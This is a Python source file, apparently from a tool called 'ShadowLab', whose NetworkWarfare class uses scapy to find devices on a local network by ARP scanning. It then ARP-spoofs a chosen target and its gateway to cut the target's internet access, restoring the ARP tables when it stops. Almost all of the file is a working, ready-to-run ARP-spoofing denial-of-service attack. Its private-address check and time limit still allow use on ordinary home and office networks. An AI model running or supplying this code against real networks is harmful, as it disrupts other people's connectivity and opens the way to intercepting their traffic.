import ipaddress
import socket
from scapy.all import ARP, Ether, srp, send, conf
import threading
import time

# Attempt to use Npcap if available on Windows
try:
    conf.use_pcap = True
except Exception:
    pass

class NetworkWarfare:
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        self.stop_attack = False
        self.attack_started_at = 0.0
        self.max_duration_seconds = 300

    def scan_network(self, ip_range="192.168.1.0/24"):
        """
        Scans the network using ARP requests.
        Returns a list of dictionaries: {'ip':, 'mac':, 'vendor':}
        """
        try:
            # Create ARP request
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp

            # Send and receive
            result = srp(packet, timeout=3, verbose=0)[0]
            
            devices = []
            for sent, received in result:
                devices.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'vendor': self._resolve_vendor(received.hwsrc)
                })
            return devices
        except PermissionError:
            return [{"error": "Permission Denied. Run with sudo."}]
        except Exception as e:
            return [{"error": str(e)}]

    def _resolve_vendor(self, mac):
        # Placeholder for OUI lookup. In a real app, use an API or local DB.
        mac_prefix = mac[:8].upper()
        if mac_prefix.startswith("00:0C:29") or mac_prefix.startswith("00:50:56"):
            return "VMware"
        elif mac_prefix.startswith("B8:27:EB"):
             return "Raspberry Pi"
        return "Unknown"

    def start_blocker(self, target_ip, gateway_ip, max_duration_seconds=300):
        """
        Starts ARP Spoofing to block internet access for target.
        """
        target = ipaddress.ip_address(target_ip)
        gateway = ipaddress.ip_address(gateway_ip)
        if target == gateway:
            raise ValueError("Target IP and gateway IP must differ")
        if target.is_loopback or gateway.is_loopback:
            raise ValueError("Cannot target localhost")
        if target.version != gateway.version:
            raise ValueError("Target IP and gateway IP must use the same IP family")
        if not target.is_private or not gateway.is_private:
            raise ValueError("Network warfare is restricted to RFC1918 lab addresses")
        if self._is_local_address(target) or self._is_local_address(gateway):
            raise ValueError("Cannot target the ShadowLab host or its configured gateway")
        try:
            duration = int(max_duration_seconds)
        except (TypeError, ValueError) as exc:
            raise ValueError("max_duration_seconds must be an integer") from exc
        if duration < 5 or duration > 3600:
            raise ValueError("max_duration_seconds must be between 5 and 3600")
        self.target_ip = str(target)
        self.gateway_ip = str(gateway)
        self.stop_attack = False
        self.max_duration_seconds = duration
        self.attack_started_at = time.time()

        # Start in thread
        t = threading.Thread(target=self._spoof_loop)
        t.daemon = True
        t.start()

    def stop_blocker(self):
        self.stop_attack = True

    def _spoof_loop(self):
        """
        sends spoofed ARP packets.
        Target sees Attacker as Gateway.
        Gateway sees Attacker as Target.
        If we don't forward packets -> Internet Blocked (DoS).
        """
        try:
            target_mac = self._get_mac(self.target_ip)
            gateway_mac = self._get_mac(self.gateway_ip)
            
            if not target_mac or not gateway_mac:
                return

            while not self.stop_attack:
                if time.time() - self.attack_started_at >= self.max_duration_seconds:
                    self.stop_attack = True
                    break
                # Tell Target I am Gateway
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=target_mac), verbose=False)
                # Tell Gateway I am Target
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=gateway_mac), verbose=False)
                time.sleep(2)
                
            # Restore
            self._restore(self.target_ip, self.gateway_ip, target_mac, gateway_mac)
        except Exception as e:
            print(f"Attack Error: {e}")

    def _get_mac(self, ip):
        try:
            # Simple ARP request to get MAC
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            return None
        return None

    def _restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
        # Send correct ARP packets to restore table
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac), count=5, verbose=False)

    def _is_local_address(self, candidate):
        try:
            host_ips = {
                str(ipaddress.ip_address(addr_info[4][0]))
                for addr_info in socket.getaddrinfo(socket.gethostname(), None)
                if addr_info and addr_info[4]
            }
        except Exception:
            host_ips = set()
        return str(candidate) in host_ips
